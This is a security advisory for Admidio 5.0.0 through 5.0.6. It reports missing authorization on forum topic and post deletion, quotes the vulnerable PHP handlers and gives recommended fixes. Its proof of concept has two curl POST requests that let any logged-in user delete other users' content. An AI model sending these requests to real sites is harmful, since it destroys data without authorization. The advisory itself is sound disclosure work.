# [M] Admidio is Missing Authorization on Forum Topic and Post Deletion

## Summary
Severity: Medium
Advisory: GHSA-g375-5wmp-xr78
CVE: CVE-2026-32818
CWE: CWE-862
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-03-16
Source: https://github.com/advisories/GHSA-g375-5wmp-xr78
Type: github-advisory

## Affected
- Packagist: `admidio/admidio` — affected >=5.0.0 <5.0.7

## Details
## Summary

The forum module in Admidio does not verify whether the current user has permission to delete forum topics or posts. Both the `topic_delete` and `post_delete` actions in `forum.php` only validate the CSRF token but perform no authorization check before calling `delete()`. Any authenticated user with forum access can delete any topic (with all its posts) or any individual post by providing its UUID.

This is inconsistent with the save/edit operations, which properly check `isAdministratorForum()` and ownership before allowing modifications.

## Details

### Vulnerable Code Path 1: Topic Deletion

File: `D:\bugcrowd\admidio\repo\modules\forum.php`, lines 98-108

The topic_delete handler validates CSRF but never calls `$topic->isEditable()`:

```php
case 'topic_delete':
    // check the CSRF token of the form against the session token
    SecurityUtils::validateCsrfToken($_POST['adm_csrf_token']);

    $topic = new Topic($gDb);
    $topic->readDataByUuid($getTopicUUID);
    $topic->delete();
    echo json_encode(array('status' => 'success'));
    break;
```

The `Topic` class has an `isEditable()` method (lines 144-164 of `ListConfiguration.php`) that properly checks `isAdministratorForum()` and `getAllEditableCategories('FOT')`, but it is never called in the delete path.

### Vulnerable Code Path 2: Post Deletion

File: `D:\bugcrowd\admidio\repo\modules\forum.php`, lines 125-134

The post_delete handler also validates CSRF but performs no authorization check:

```php
case 'post_delete':
    // check the CSRF token of the form against the session token
    SecurityUtils::validateCsrfToken($_POST['adm_csrf_token']);

    $post = new Post($gDb);
    $post->readDataByUuid($getPostUUID);
    $post->delete();
    echo json_encode(array('status' => 'success'));
    break;
```

### Contrast with Save Operations (Properly Authorized)

The `ForumTopicService::savePost()` method in `D:\bugcrowd\admidio\repo\src\Forum\Service\ForumTopicService.php` lines 117-121 correctly verifies authorization:

```php
if ($postUUID !== '') {
    $post->readDataByUuid($postUUID);
    if (!$gCurrentUser->isAdministratorForum() && $post->getValue('fop_usr_id_create') !== $gCurrentUser->getValue('usr_id')) {
        throw new Exception('You are not allowed to edit this post.');
    }
}
```

The delete operations should have equivalent checks but do not.

### Module-Level Access Check

File: `D:\bugcrowd\admidio\repo\modules\forum.php`, lines 53-59

The only check before the delete operations is the module-level access check:

```php
if ($gSettingsManager->getInt('forum_module_enabled') === 0) {
    throw new Exception('SYS_MODULE_DISABLED');
} elseif ($gSettingsManager->getInt('forum_module_enabled') === 1
    && !in_array($getMode, array('cards', 'list', 'topic')) && !$gValidLogin) {
    throw new Exception('SYS_NO_RIGHTS');
}
```

This only ensures the user is logged in for write operations. It does not check whether the user has forum admin rights or is the author of the content being deleted.

## PoC

**Prerequisites:** Two user accounts - a regular logged-in user (attacker) and a forum admin who has created topics and posts.

**Step 1: Attacker discovers a topic UUID**

The attacker visits any forum topic page. Topic UUIDs are visible in the URL and page source.

**Step 2: Attacker deletes the topic (and all its posts)**

```
curl -X POST "https://TARGET/adm_program/modules/forum.php?mode=topic_delete&topic_uuid=<TOPIC_UUID>" \
  -H "Cookie: ADMIDIO_SESSION_ID=<attacker_session>" \
  -d "adm_csrf_token=<attacker_csrf_token>"
```

Expected response: `{"status":"success"}`

The topic and all its posts are permanently deleted from the database.

**Step 3: Attacker deletes an individual post**

```
curl -X POST "https://TARGET/adm_program/modules/forum.php?mode=post_delete&post_uuid=<POST_UUID>" \
  -H "Cookie: ADMIDIO_SESSION_ID=<attacker_session>" \
  -d "adm_csrf_token=<attacker_csrf_token>"
```

Expected response: `{"status":"success"}`

## Impact

- **Data Destruction:** Any logged-in user can permanently delete any forum topic (including all associated posts) or any individual post. The `Topic::delete()` method cascades and removes all posts belonging to the topic.
- **Content Integrity:** Forum content created by administrators or other authorized users can be destroyed by any regular member.
- **No Undo:** The deletion is permanent. There is no soft-delete or trash mechanism. The only recovery would be from database backups.
- **Low Barrier:** The attacker only needs a valid login and the UUID of the target content. UUIDs are visible in forum page URLs and are not secret.

## Recommended Fix

### Fix 1: Add authorization check to topic_delete

```php
case 'topic_delete':
    SecurityUtils::validateCsrfToken($_POST['adm_csrf_token']);

    $topic = new Topic($gDb);
    $topic->readDataByUuid($getTopicUUID);

    // Add authorization check
    if (!$topic->isEditable()) {
        throw new Exception('SYS_NO_RIGHTS');
    }

    $topic->delete();
    echo json_encode(array('status' => 'success'));
    break;
```

### Fix 2: Add authorization check to post_delete

```php
case 'post_delete':
    SecurityUtils::validateCsrfToken($_POST['adm_csrf_token']);

    $post = new Post($gDb);
    $post->readDataByUuid($getPostUUID);

    // Add authorization check - only forum admins or the post author can delete
    if (!$gCurrentUser->isAdministratorForum()
        && (int)$post->getValue('fop_usr_id_create') !== $gCurrentUserId) {
        throw new Exception('SYS_NO_RIGHTS');
    }

    $post->delete();
    echo json_encode(array('status' => 'success'));
    break;
```

## References
- https://github.com/Admidio/admidio/security/advisories/GHSA-g375-5wmp-xr78
- https://nvd.nist.gov/vuln/detail/CVE-2026-32818
- https://github.com/Admidio/admidio
- https://github.com/Admidio/admidio/releases/tag/v5.0.7
